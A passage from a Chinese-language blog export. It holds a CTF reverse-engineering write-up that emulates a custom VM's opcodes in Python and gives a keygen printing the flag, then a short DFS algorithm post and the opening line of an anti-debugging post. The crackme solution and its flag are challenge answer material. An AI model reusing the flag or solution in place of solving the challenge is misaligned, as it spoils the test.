have_fun_in_vm_hahaa</span></span><br></pre></td></tr></table></figure>



<h2 id="ezvm-vmre"><a href="#ezvm-vmre" class="headerlink" title="ezvm | vmre"></a>ezvm | vmre</h2><p>与上一个vm不同的是引入了寄存器和flag位 采用函数表的方式存放op 还是先弄懂每个op的含义 然后模拟出加密过程:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># emulate the procees of vm</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">op_1_extract_v_from_reg_by_hb</span></span><br><span class="line"><span class="string">op_1_extract_v_from_reg_by_lb</span></span><br><span class="line"><span class="string">op_2_save_in_reg_by_hb</span></span><br><span class="line"><span class="string">op_3_nop                      ; pt += 1</span></span><br><span class="line"><span class="string">op_4_add                      ; reg[hb] += reg[lb]</span></span><br><span class="line"><span class="string">op_5_minus                    ; reg[hb] -= reg[lb]</span></span><br><span class="line"><span class="string">op_6_mul                      ; reg[hb] *= reg[lb]</span></span><br><span class="line"><span class="string">op_7_div                      ; reg[hb] /= reg[lb]</span></span><br><span class="line"><span class="string">op_8_inc                      ; reg[hb] += 1</span></span><br><span class="line"><span class="string">op_9_dec                      ; reg[hb] -= 1</span></span><br><span class="line"><span class="string">op_10_xor                     ; reg[hb] ^= reg[lb]</span></span><br><span class="line"><span class="string">op_11_and                     ; reg[hb] &amp;= reg[lb]</span></span><br><span class="line"><span class="string">op_12_pop_in                  ; pop reg[hb] in stack</span></span><br><span class="line"><span class="string">op_13                         ; 组合op[9]接下来的4个数据(大端序)并入栈</span></span><br><span class="line"><span class="string">op_14                         ; esp += 4</span></span><br><span class="line"><span class="string">op_15                         ; reg[hb] = reg[lb]</span></span><br><span class="line"><span class="string">op_16                         ; reg[hb] = input[k]</span></span><br><span class="line"><span class="string">op_17                         ; input[k] = reg[hb]</span></span><br><span class="line"><span class="string">op_18                         ; check reg[3]:reg[3] = 1 -&gt; *op[9] -= *(op[9] + 1)</span></span><br><span class="line"><span class="string">op_19                         ; set reg[4]:reg[4] = sign of (reg[hb] - reg[lb])</span></span><br><span class="line"><span class="string">op_20                         ; check reg[4]:reg[4] == -1 -&gt; op[9] += 2 + *(op[9] + 1) else += 2</span></span><br><span class="line"><span class="string">op_21                         ; anti-op_20, reg[4] == 1</span></span><br><span class="line"><span class="string">op_22                         ; else reg[4] == 0</span></span><br><span class="line"><span class="string">op_23                         ; k++</span></span><br><span class="line"><span class="string">op_24                         ; k--</span></span><br><span class="line"><span class="string">op_25                         ; *(op[9] + i) ^= 0x66 for i in range(1, 16)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">stack = [<span class="number">0</span>] * <span class="number">0x100</span></span><br><span class="line">input_text = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">input</span>()]</span><br><span class="line">k = <span class="number">0</span></span><br><span class="line">reg = [<span class="number">0</span>] * <span class="number">5</span></span><br><span class="line">esp = <span class="built_in">len</span>(stack) - <span class="number">1</span></span><br><span class="line">opcode = [<span class="number">0x70</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x1E</span>, <span class="number">0x71</span>, <span class="number">0x30</span>, <span class="number">0x73</span>, <span class="number">0x00</span>, <span class="number">0x7A</span>, </span><br><span class="line">  <span class="number">0x73</span>, <span class="number">0x10</span>, <span class="number">0x67</span>, <span class="number">0x01</span>, <span class="number">0x7B</span>, <span class="number">0x74</span>, <span class="number">0x00</span>, <span class="number">0x7A</span>, <span class="number">0x75</span>, <span class="number">0x0B</span>, </span><br><span class="line">  <span class="number">0x70</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x1E</span>, <span class="number">0x71</span>, <span class="number">0x30</span>, <span class="number">0x7B</span>, <span class="number">0x75</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x70</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x1E</span>, <span class="number">0x71</span>, <span class="number">0x30</span>, <span class="number">0x73</span>, <span class="number">0x10</span>, <span class="number">0x7A</span>, </span><br><span class="line">  <span class="number">0x73</span>, <span class="number">0x00</span>, <span class="number">0x6D</span>, <span class="number">0x01</span>, <span class="number">0x74</span>, <span class="number">0x00</span>, <span class="number">0x75</span>, <span class="number">0x09</span>, <span class="number">0x66</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC7</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>, <span class="number">0x0C</span>, <span class="number">0xE5</span>, <span class="number">0x08</span>, </span><br><span class="line">  <span class="number">0xAD</span>, <span class="number">0xDE</span>, <span class="number">0xAF</span>, <span class="number">0xCD</span>, <span class="number">0x67</span>, <span class="number">0xBF</span>, <span class="number">0x1F</span>, <span class="number">0xBF</span>, <span class="number">0x1E</span>, <span class="number">0x68</span>, </span><br><span class="line">  <span class="number">0xFE</span>, <span class="number">0x25</span>, <span class="number">0xFD</span>, <span class="number">0x6F</span>, <span class="number">0x08</span>, <span class="number">0x50</span>, <span class="number">0xCD</span>, <span class="number">0x15</span>, <span class="number">0xB0</span>, <span class="number">0x21</span>, </span><br><span class="line">  <span class="number">0x8B</span>, <span class="number">0x3E</span>, <span class="number">0xFD</span>, <span class="number">0x73</span>, <span class="number">0xED</span>, <span class="number">0x90</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>]</span><br><span class="line">pointer_to_opcode = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> pointer_to_opcode &lt; <span class="built_in">len</span>(opcode):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;==================opcode: &quot;</span> + <span class="built_in">hex</span>(opcode[pointer_to_opcode]), opcode[pointer_to_opcode] - <span class="number">0x67</span> + <span class="number">4</span>, <span class="string">f&quot;is excuted=======================opcode at <span class="subst">&#123;pointer_to_opcode&#125;</span>=====================&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x66</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;failed&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x67</span>:</span><br><span class="line">        <span class="built_in">print</span>(reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>], reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>], <span class="string">&quot;\n&quot;</span>, <span class="string">&quot;reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) + <span class="string">&quot;] += reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>]  &amp; <span class="number">0xf</span>) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">        reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>] += reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>]</span><br><span class="line">        pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x68</span>:</span><br><span class="line">        <span class="built_in">print</span>(reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>], reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>], <span class="string">&quot;\n&quot;</span>, <span class="string">&quot;reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) + <span class="string">&quot;] -= reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>]  &amp; <span class="number">0xf</span>) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">        reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>] -= reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>]</span><br><span class="line">        pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x69</span>:</span><br><span class="line">        <span class="built_in">print</span>(reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>], reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>], <span class="string">&quot;\n&quot;</span>, <span class="string">&quot;reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) + <span class="string">&quot;] *= reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>]  &amp; <span class="number">0xf</span>) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">        reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>] *= reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>]</span><br><span class="line">        pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x6A</span>:</span><br><span class="line">        <span class="built_in">print</span>(reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>], reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>], <span class="string">&quot;\n&quot;</span>, <span class="string">&quot;reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) + <span class="string">&quot;] /= reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>]  &amp; <span class="number">0xf</span>) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">        reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>] /= reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>]</span><br><span class="line">        pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x6B</span>:</span><br><span class="line">        <span class="built_in">print</span>(reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>], <span class="string">&quot;reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) + <span class="string">&quot;] += 1&quot;</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>] += <span class="number">1</span></span><br><span class="line">        pointer_to_opcode += <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x6C</span>:</span><br><span class="line">        <span class="built_in">print</span>(reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>], <span class="string">&quot;reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) + <span class="string">&quot;] -= 1&quot;</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>] -= <span class="number">1</span></span><br><span class="line">        pointer_to_opcode += <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x6D</span>:</span><br><span class="line">        <span class="built_in">print</span>(reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>], reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>], <span class="string">&quot;\n&quot;</span>, <span class="string">&quot;reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) + <span class="string">&quot;] ^= reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>]  &amp; <span class="number">0xf</span>) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">        reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>] ^= reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>]</span><br><span class="line">        pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x6E</span>:</span><br><span class="line">        <span class="built_in">print</span>(reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>], reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>], <span class="string">&quot;\n&quot;</span>, <span class="string">&quot;reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) + <span class="string">&quot;] &amp;= reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>]  &amp; <span class="number">0xf</span>) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">        reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>] &amp;= reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>]</span><br><span class="line">        pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x6F</span>:</span><br><span class="line">        <span class="built_in">print</span>(reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>], <span class="string">&quot;\n&quot;</span>, <span class="string">&quot;pop reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) + <span class="string">&quot;] in stack&quot;</span>)</span><br><span class="line">        esp -= <span class="number">1</span></span><br><span class="line">        stack[esp] = reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>]</span><br><span class="line">        pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x70</span>:</span><br><span class="line">        data = opcode[pointer_to_opcode + <span class="number">1</span>] &lt;&lt; <span class="number">24</span> | opcode[pointer_to_opcode + <span class="number">2</span>] &lt;&lt; <span class="number">16</span> | opcode[pointer_to_opcode + <span class="number">3</span>] &lt;&lt; <span class="number">8</span> | opcode[pointer_to_opcode + <span class="number">4</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;pop &quot;</span> + <span class="built_in">hex</span>(data) + <span class="string">&quot; in stack&quot;</span>)</span><br><span class="line">        esp -= <span class="number">1</span></span><br><span class="line">        stack[esp] = data</span><br><span class="line">        pointer_to_opcode += <span class="number">5</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x71</span>:</span><br><span class="line">        reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>] = stack[esp]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;pop <span class="subst">&#123;stack[esp]&#125;</span> out to reg[<span class="subst">&#123;opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>&#125;</span>] and esp += 1&quot;</span>)</span><br><span class="line">        esp += <span class="number">1</span></span><br><span class="line">        pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x72</span>:</span><br><span class="line">        <span class="built_in">print</span>(reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>], reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>], <span class="string">&quot;\n&quot;</span>, <span class="string">&quot;reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) + <span class="string">&quot;] = reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>]  &amp; <span class="number">0xf</span>) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">        reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>] = reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>]</span><br><span class="line">        pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x73</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) + <span class="string">&quot;] = input[&quot;</span> + <span class="built_in">str</span>(k) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">        reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>] = input_text[k]</span><br><span class="line">        pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x74</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;input[&quot;</span> + <span class="built_in">str</span>(k) + <span class="string">&quot;] = reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) + <span class="string">&quot;]&quot;</span> )</span><br><span class="line">        input_text[k] = reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>]</span><br><span class="line">        pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x75</span>:</span><br><span class="line">        <span class="keyword">if</span> reg[<span class="number">3</span>]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;jump to&quot;</span>, <span class="built_in">hex</span>(pointer_to_opcode - opcode[pointer_to_opcode + <span class="number">1</span>]))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;reg[3] = <span class="subst">&#123;reg[<span class="number">3</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            reg[<span class="number">3</span>] -= <span class="number">1</span></span><br><span class="line">            pointer_to_opcode -= opcode[pointer_to_opcode + <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;not jump&quot;</span>)</span><br><span class="line">            pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x76</span>:</span><br><span class="line">        <span class="keyword">if</span> reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>] == reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>]:</span><br><span class="line">            reg[<span class="number">4</span>] = <span class="number">0</span></span><br><span class="line">            pointer_to_opcode += <span class="number">2</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        reg[<span class="number">4</span>] = <span class="number">1</span> <span class="keyword">if</span> reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>] &gt; reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>] <span class="keyword">else</span> -<span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;set reg[4] to&quot;</span>, reg[<span class="number">4</span>], <span class="string">&quot;cause&quot;</span>, reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>], reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>])</span><br><span class="line">        pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x77</span>:</span><br><span class="line">        <span class="keyword">if</span> reg[<span class="number">4</span>] == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;jump to&quot;</span>, <span class="built_in">hex</span>(pointer_to_opcode + opcode[pointer_to_opcode + <span class="number">1</span>]))</span><br><span class="line">            pointer_to_opcode += opcode[pointer_to_opcode + <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;not jump cause reg[4] = &quot;</span>, reg[<span class="number">4</span>])</span><br><span class="line">            pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x78</span>:</span><br><span class="line">        <span class="keyword">if</span> reg[<span class="number">4</span>] == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;jump to&quot;</span>, <span class="built_in">hex</span>(pointer_to_opcode + opcode[pointer_to_opcode + <span class="number">1</span>]))</span><br><span class="line">            pointer_to_opcode += opcode[pointer_to_opcode + <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;not jump cause reg[4] = &quot;</span>, reg[<span class="number">4</span>])</span><br><span class="line">            pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x79</span>:</span><br><span class="line">        <span class="keyword">if</span> reg[<span class="number">4</span>] == -<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;jump to&quot;</span>, <span class="built_in">hex</span>(pointer_to_opcode + opcode[pointer_to_opcode + <span class="number">1</span>]))</span><br><span class="line">            pointer_to_opcode += opcode[pointer_to_opcode + <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;not jump cause reg[4] = &quot;</span>, reg[<span class="number">4</span>])</span><br><span class="line">            pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x7A</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;k++&quot;</span>)</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">        pointer_to_opcode += <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x7B</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;k--&quot;</span>)</span><br><span class="line">        k -= <span class="number">1</span></span><br><span class="line">        pointer_to_opcode += <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x7C</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">16</span>):</span><br><span class="line">            <span class="built_in">print</span>(opcode[pointer_to_opcode + <span class="number">1</span>], <span class="string">&quot;\n&quot;</span>, <span class="string">&quot;opcode[&quot;</span> + <span class="built_in">str</span>(pointer_to_opcode + i) + <span class="string">&quot;] ^= 0x66&quot;</span>)</span><br><span class="line">            stack[esp + i] ^= <span class="number">0x66</span></span><br><span class="line">        pointer_to_opcode += <span class="number">16</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    pointer_to_opcode += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>发现加密过程就是flag的每一位+&#x3D;下一位(除最后一位) 然后再逆序每一位^&#x3D;上一位(除第一位) 据此写出keygen:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = [<span class="number">0xC7</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>, <span class="number">0x0C</span>, <span class="number">0xE5</span>, <span class="number">0x08</span>, <span class="number">0xAD</span>, <span class="number">0xDE</span>, <span class="number">0xAF</span>, <span class="number">0xCD</span>, </span><br><span class="line">  <span class="number">0x67</span>, <span class="number">0xBF</span>, <span class="number">0x1F</span>, <span class="number">0xBF</span>, <span class="number">0x1E</span>, <span class="number">0x68</span>, <span class="number">0xFE</span>, <span class="number">0x25</span>, <span class="number">0xFD</span>, <span class="number">0x6F</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x50</span>, <span class="number">0xCD</span>, <span class="number">0x15</span>, <span class="number">0xB0</span>, <span class="number">0x21</span>, <span class="number">0x8B</span>, <span class="number">0x3E</span>, <span class="number">0xFD</span>, <span class="number">0x73</span>, </span><br><span class="line">  <span class="number">0xED</span>, <span class="number">0x90</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc) - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">    enc[i] ^= enc[i - <span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc) - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">    enc[i - <span class="number">1</span>] -= enc[i]</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(enc[i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># begin&#123;r3@11y_A_B4by_34$y_FK_Vm!&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
        <category>REV</category>
        <category>WPs</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>1!秒钟寄!一个算法:DFS-深度优先搜索</title>
    <url>/2024/03/16/1-%E7%A7%92%E9%92%9F%E5%AF%84-%E4%B8%80%E4%B8%AA%E7%AE%97%E6%B3%95-DFS-%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/</url>
    <content><![CDATA[<h3 id="算法概述"><a href="#算法概述" class="headerlink" title="算法概述"></a>算法概述</h3><p>DFS用于找到图中从给定起点到终点所有无交点路线(我猜的) 并不保证全部路线都能找到 也不保证找到的路线是最短的</p>
<p> 因为CTF遇到过好几次 所以学习一下</p>
<span id="more"></span>

<h3 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dfs_iterative_paths</span>(<span class="params">graph, start, end = start</span>):</span><br><span class="line">    visited = <span class="built_in">set</span>()</span><br><span class="line">    stack = [(start, [start])]</span><br><span class="line"></span><br><span class="line">    paths = []</span><br><span class="line">    <span class="keyword">while</span> stack:</span><br><span class="line">        node, path = stack.pop()</span><br><span class="line">        visited.add(node)</span><br><span class="line">        <span class="keyword">if</span> node == end:</span><br><span class="line">            paths.append(path)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> neighbor <span class="keyword">in</span> graph[node]:</span><br><span class="line">            <span class="keyword">if</span> neighbor <span class="keyword">not</span> <span class="keyword">in</span> visited:</span><br><span class="line">                stack.append((neighbor, path + [neighbor]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> paths</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
        <category>图论</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>反调试技术</title>
    <url>/2024/03/26/%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<p>记录一下遇到的反调试方法和反制措施<span id="more"></span></p>
